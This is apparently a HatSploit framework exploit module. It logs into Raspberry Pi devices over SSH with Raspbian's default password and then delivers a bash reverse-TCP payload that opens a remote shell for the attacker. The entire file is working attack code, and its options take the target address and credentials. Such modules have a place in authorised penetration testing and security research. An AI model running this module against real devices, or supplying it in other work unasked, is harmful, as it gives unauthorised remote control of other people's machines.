#!/usr/bin/env python3

#
# This module requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.module import Module
from hatsploit.utils.ssh import SSHClient
from hatsploit.utils.handler import Handler


class HatSploitModule(Module, SSHClient, Handler):
    details = {
        'Name': "Raspbian default SSH credentials",
        'Module': "exploit/linux/ssh/raspbian_default_credentials",
        'Authors': [
            'Ivan Nikolsky (enty8080) - module developer'
        ],
        'Description': "Bypass Raspberry PI SSH authorization using Raspbian default SSH password.",
        'Comments': [
            ''
        ],
        'Platform': "linux",
        'Rank': "medium"
    }

    payload = {
        'Value': "unix/generic/bash_reverse_tcp",
        'Categories': None,
        'Architectures': None,
        'Platforms': [
            'linux',
            'unix',
            'macos',
            'iphoneos',
            'android'
        ],
        'Types': None
    }

    options = {
        'RHOST': {
            'Description': "Remote host.",
            'Value': None,
            'Type': "ip",
            'Required': True
        },
        'RPORT': {
            'Description': "Remote port.",
            'Value': 22,
            'Type': "port",
            'Required': True
        },
        'USERNAME': {
            'Description': "SSH username.",
            'Value': None,
            'Type': None,
            'Required': True
        },
        'PASSWORD': {
            'Description': "SSH password.",
            'Value': None,
            'Type': None,
            'Required': True
        },
    }

    def run(self):
        remote_host, remote_port, username, password = self.parse_options(self.options)

        self.print_process(f"Exploiting {remote_host}...")
        client = self.open_ssh(
            remote_host,
            remote_port,
            username,
            password
        )

        if not client.connect():
            self.print_error("Target is not vulnerable!")
            return

        self.handle_session(
            host=remote_host,
            sender=client.send_command
        )

        client.disconnect()
